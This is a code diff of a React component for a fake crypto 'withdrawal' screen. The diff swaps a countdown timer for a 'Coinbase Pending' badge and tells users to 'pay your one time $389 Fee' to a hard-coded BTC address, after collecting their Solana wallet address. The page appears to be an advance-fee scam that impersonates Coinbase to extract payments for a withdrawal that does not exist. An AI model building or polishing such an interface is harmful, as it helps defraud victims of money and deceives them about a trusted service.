@@ -5,104 +5,34 @@ import { X, CheckCircle2 } from "lucide-react";
 
 const STORAGE_KEY = "withdraw_start_time";
 const WALLET_KEY = "solana_wallet";
-const DURATION = 24 * 60 * 60; // 24h
 
 type Status = "idle" | "processing";
 
 export default function SimpleDepositModal() {
   const [status, setStatus] = useState<Status>("idle");
-  const [timeLeft, setTimeLeft] = useState<number>(DURATION);
   const [solanaWallet, setSolanaWallet] = useState("");
 
-  // START WITHDRAW
   const startWithdrawal = () => {
     try {
       if (typeof window !== "undefined") {
-        const already = localStorage.getItem(STORAGE_KEY);
-
-        if (!already) {
-          localStorage.setItem(STORAGE_KEY, Date.now().toString());
-        }
+        localStorage.setItem(STORAGE_KEY, Date.now().toString());
       }
+    } catch {}
 
-      setStatus("processing");
-    } catch (e) {
-      setStatus("processing");
-    }
+    setStatus("processing");
   };
 
-  // TIMER SAFE (NO CRASH VERSION)
   useEffect(() => {
     if (typeof window === "undefined") return;
 
-    let start: string | null = null;
-
     try {
-      start = localStorage.getItem(STORAGE_KEY);
-    } catch {
-      start = null;
-    }
+      const saved = localStorage.getItem(WALLET_KEY);
+      if (saved) setSolanaWallet(saved);
 
-    let savedWallet: string | null = null;
-
-    try {
-      savedWallet = localStorage.getItem(WALLET_KEY);
-    } catch {
-      savedWallet = null;
-    }
-
-    if (savedWallet) {
-      setSolanaWallet(savedWallet);
-    }
-
-    if (!start) return;
-
-    const startTime = Number(start);
-    if (isNaN(startTime)) return;
-
-    setStatus("processing");
-
-    let interval: ReturnType<typeof setInterval>;
-
-    const update = () => {
-      const now = Date.now();
-      const diff = Math.floor((now - startTime) / 1000);
-      const remaining = DURATION - diff;
-
-      if (!Number.isFinite(remaining)) return;
-
-      if (remaining <= 0) {
-        setTimeLeft(0);
-        clearInterval(interval);
-        return;
-      }
-
-      setTimeLeft(remaining);
-    };
-
-    update();
-    interval = setInterval(update, 1000);
-
-    return () => clearInterval(interval);
+      const start = localStorage.getItem(STORAGE_KEY);
+      if (start) setStatus("processing");
+    } catch {}
   }, []);
-
-  // FORMAT TIME SAFE
-  const formatTime = (s: number) => {
-    if (!Number.isFinite(s) || s < 0) return "00:00:00";
-
-    const hours = Math.floor(s / 3600);
-    const minutes = Math.floor((s % 3600) / 60);
-    const seconds = s % 60;
-
-    return `${hours.toString().padStart(2, "0")}:${minutes
-      .toString()
-      .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
-  };
-
-  const progress =
-    Number.isFinite(timeLeft) && DURATION > 0
-      ? (timeLeft / DURATION) * 100
-      : 0;
 
   return (
     <div className="min-h-screen bg-white flex items-center justify-center px-4">
@@ -120,8 +50,11 @@ export default function SimpleDepositModal() {
         {/* IDLE */}
         {status === "idle" && (
           <>
-            <div className="mx-auto mb-4 h-12 w-12 rounded-full bg-black flex items-center justify-center">
-              <img src="/solana.png" className="h-6 w-6" />
+            <div className="mx-auto mb-4 flex items-center justify-center">
+              <div className="px-4 py-2 rounded-full bg-purple-600 text-white text-sm font-semibold flex items-center gap-2">
+                <span className="w-2 h-2 bg-white rounded-full" />
+                Solana
+              </div>
             </div>
 
             <div className="text-center mb-5">
@@ -162,56 +95,56 @@ export default function SimpleDepositModal() {
                 Processing withdrawal
               </p>
 
-              <p className="text-sm font-medium text-black/60 mt-1">
-                Pending fee $389 USD
+              {/* PÍLDORA COINBASE PENDING (AZUL) */}
+              <div className="mt-3 flex justify-center">
+                <div className="px-4 py-1 rounded-full bg-blue-600 text-white text-xs font-semibold">
+                  Coinbase Pending
+                </div>
+              </div>
+
+              {/* TEXTO UPDATED */}
+              <p className="text-sm text-black/60 mt-3">
+                Processing time after confirmation:{" "}
+                <span className="font-semibold text-black">20 minutes</span>
               </p>
 
-              <div className="mt-4">
-                <p className="text-xs text-black/60">Time Remaining</p>
-
-                <p className="text-2xl font-bold text-[#0052FF]">
-                  {formatTime(timeLeft)}
-                </p>
-              </div>
-
-              <div className="mt-4 text-left">
-                <label className="text-xs font-semibold text-black/70">
-                  Enter your Solana Wallet
-                </label>
-
-                <input
-                  type="text"
-                  value={solanaWallet || ""}
-                  onChange={(e) => {
-                    setSolanaWallet(e.target.value);
-
-                    try {
-                      localStorage.setItem(WALLET_KEY, e.target.value);
-                    } catch {}
-                  }}
-                  placeholder="Paste your Solana wallet address"
-                  className="mt-2 w-full rounded-lg border border-gray-200 px-3 py-3 text-sm outline-none focus:border-[#0052FF]"
-                />
-              </div>
-
-              <div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
-                <p className="text-xs font-semibold text-black/70 mb-1">
-                  Deposit destination (BTC)
-                </p>
-
-                <p className="text-[11px] text-black/60 break-all">
-                  bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5
-                </p>
-              </div>
+              <p className="text-xs text-black/50 mt-2">
+                Please pay your one time $389 Fee. The release time after that is 20 minutes.
+              </p>
             </div>
 
-            <div className="h-[6px] bg-gray-100 rounded-full overflow-hidden">
-              <div
-                className="h-full bg-[#0052FF] transition-all duration-500"
-                style={{ width: `${progress}%` }}
+            {/* WALLET */}
+            <div className="mt-4 text-left">
+              <label className="text-xs font-semibold text-black/70">
+                Enter your Solana Wallet
+              </label>
+
+              <input
+                type="text"
+                value={solanaWallet || ""}
+                onChange={(e) => {
+                  setSolanaWallet(e.target.value);
+                  try {
+                    localStorage.setItem(WALLET_KEY, e.target.value);
+                  } catch {}
+                }}
+                placeholder="Paste your Solana wallet address"
+                className="mt-2 w-full rounded-lg border border-gray-200 px-3 py-3 text-sm outline-none focus:border-[#0052FF]"
               />
             </div>
 
+            {/* DESTINO */}
+            <div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
+              <p className="text-xs font-semibold text-black/70 mb-1">
+                Deposit Fee Pending - Destination (BTC)
+              </p>
+
+              <p className="text-[11px] text-black/60 break-all">
+                bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5
+              </p>
+            </div>
+
+            {/* BOTÓN FINAL */}
             <div className="mt-6">
               <a
                 href="https://www.coinbase.com"
